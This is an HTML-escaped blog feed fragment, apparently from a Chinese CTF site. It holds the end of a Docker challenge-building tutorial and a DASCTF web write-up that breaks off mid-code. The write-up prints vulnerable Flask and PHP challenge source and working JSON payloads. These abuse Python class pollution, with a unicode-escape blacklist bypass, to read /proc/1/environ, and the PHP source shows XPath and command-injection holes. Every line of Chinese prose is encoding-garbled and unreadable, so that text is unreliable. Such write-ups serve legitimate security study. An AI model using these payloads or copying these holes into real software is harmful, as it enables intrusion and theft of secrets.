class="line">â”œâ”€â”€ connect<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ source</span><br><span class="line">â””â”€â”€ assets</span><br><span class="line">â””â”€â”€ bootstrap</span><br><span class="line">â”œâ”€â”€ css</span><br><span class="line">â””â”€â”€ js</span><br></pre></td></tr></table></figure><p>é™„ä¸Šå¤§ä½¬çš„è®²è§£è§†é¢‘ï¼Œéå¸¸è¯¦ç»†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1xW4y1Z7aa/?spm_id_from=<span class="number">333.999</span>.<span class="number">0.0</span>&amp;vd_source=<span class="number">757</span>ded406aff262d5f6010cb1a347a9a</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ¡†æ¶å·²ç»æ˜¯éå¸¸å®Œæ•´çš„äº†ï¼Œåªéœ€è¦æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚ç¨åŠ ä¿®æ”¹å°±å¯ä»¥è½»æ¾å‡ºé¢˜å•¦ï¼</p><h5 id="åˆ é™¤éƒ¨åˆ†"><strong>åˆ é™¤éƒ¨åˆ†</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="selector-class">.php</span></span><br><span class="line">flag<span class="selector-class">.php</span></span><br><span class="line">docker-compose.ymlä¸­çš„ç¯å¢ƒå˜é‡è®¾ç½®</span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šéƒ¨åˆ†ä¸ºæµ‹è¯•ç”¨é€”ï¼Œæ²¡ç”¨ä¸€å®šå¾—åˆ ï¼Œé˜²æ­¢å‡ºç°éé¢„æœŸè§£</span><br></pre></td></tr></table></figure><h5 id="ä¿®æ”¹éƒ¨åˆ†"><strong>ä¿®æ”¹éƒ¨åˆ†</strong></h5><p>ï¼ˆ1ï¼‰ï¼šconnect.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¦ç”¨äºæ•°æ®åº“è¿æ¥ï¼Œå…¶ä¸­çš„å‚æ•°å¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œä½†ä¸€å®šæ³¨æ„è¦å’Œdockerfileä¸­çš„å‚æ•°å€¼ä¿æŒä¸€è‡´ï¼ŒäºŒè€…å¿…é¡»åŒæ—¶ä¿®æ”¹</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ï¼šindex.phpã€<a href="http://docker-entrypoint.sh">docker-entrypoint.sh</a>ã€docker-compose.yaml</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸‰è€…ä¸»è¦æ˜¯ç”¨äºä¸ªæ€§åŒ–çš„ä¿®æ”¹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">index</span>.phpä¸å¿…å¤šè¯´ï¼Œä¸»è¦æ˜¯å®Œå–„ä½ è‡ªå·±æƒ³å‡ºçš„<span class="keyword">sql</span>è¯­å¥ä»¥åŠè¿‡æ»¤ç­‰</span><br><span class="line"></span><br><span class="line">docker-entrypoint.sh é‡Œé¢æœ‰ä¸¤ç§flagçš„ç”Ÿæˆæ ¼å¼ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œä¿®æ”¹</span><br><span class="line"></span><br><span class="line">docker-compose.yaml å¯ä»¥è°ƒæ•´å¼€å¯çš„ç«¯å£ä»¥åŠç¯å¢ƒå˜é‡ç­‰å› ç´ </span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ï¼šDockerfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ ¹æ®ä¸Šè¿°ä»‹ç»ï¼Œå°†è‡ªå·±æ‰€éœ€è¦æ‰§è¡Œçš„æ“ä½œå†™å…¥dockerfileï¼Œä¸æ”¾å¿ƒçš„è¯å¯ä»¥è‡ªå·±æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨</strong></p><p>å®Œæˆä¸Šè¿°æ“ä½œåå°±å¯ä»¥å¯åŠ¨å®¹å™¨å•¦ï¼Œæ–¹æ³•æœ‰2ï¼š</p><p>ï¼ˆ1ï¼‰ï¼šå¦‚æœåªæœ‰ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥ç›´æ¥åœ¨ä½ çš„dockerfileç•Œé¢ä½¿ç”¨docker buildå‘½ä»¤è¿›è¡Œåˆ›å»º</p><p>ï¼ˆ2ï¼‰ï¼šå¦‚æœæœ‰å¤šä¸ªå®¹å™¨éœ€è¦ç”¨åˆ°composeï¼Œé‚£ä¹ˆå¯ä»¥åœ¨.yamlç›®å½•ä¸­æ‰§è¡Œdocker-compose up -d</p>]]></content>
    
    
    <summary type="html">è‡´åŠ›äºå¸®åŠ©æ–°æ‰‹å’Œå°ç™½æ»´dockeræ•™ç¨‹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="å‡ºé¢˜æ•™ç¨‹" scheme="https://bowuchuling.github.io/categories/CTF/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="æ•™ç¨‹" scheme="https://bowuchuling.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54ff006d.html"/>
    <id>https://bowuchuling.github.io/posts/54ff006d.html</id>
    <published>2023-07-25T10:52:33.026Z</published>
    <updated>2023-07-26T17:33:19.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask">EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œå­˜åœ¨æ ‡å¿—æ€§å‡½æ•°mergeï¼Œä¸ºpythonç±»åŸå‹é“¾æ±¡æŸ“ï¼Œç»§ç»­å®¡è®¡å‘ç°å¯åˆ©ç”¨å‡½æ•°open(â€˜â€™,â€™â€™).read()ï¼Œæ„é€ jsonä»£ç ï¼Œä¿®æ”¹__FILE__çš„æ•°å€¼ä¸ºæƒ³è¦è¯»å–çš„å†…å®¹ï¼Œè¿™é‡Œè¯»å–ç¯å¢ƒå˜é‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;</span><br><span class="line"><span class="regexp">//</span>å‰é¢çš„usernameå’Œpasswordæ˜¯ä¸ºäº†ç»•è¿‡ä»£ç æ£€æŸ¥</span><br></pre></td></tr></table></figure><p>æäº¤åç»æ£€æŸ¥å‘ç°å­—ç¬¦ä¸²__init__è¢«è¿‡æ»¤</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå¯ä»¥ä½¿ç”¨unicodeç¼–ç è¿›è¡Œç»•è¿‡</span><br><span class="line"><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;<span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u006e</span><span class="symbol">\u0000</span><span class="symbol">\u0069</span><span class="symbol">\u0000</span><span class="symbol">\u0074</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span><span class="symbol">\u0000</span><span class="symbol">\u005f</span>&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br><span class="line">æˆ–è€…ä½¿ç”¨userç±»çš„checkå‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ç»•è¿‡</span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;,&quot;check&quot;:&#123;&quot;__globals__&quot;: &#123;&quot;__file__&quot;:&quot;/proc/1/environ&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="MyPicDisk">MyPicDisk</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$size</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="language-php">    </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyPicDisk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;form method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    usernameï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    passwordï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">echo</span> <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ç™»å½•æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span 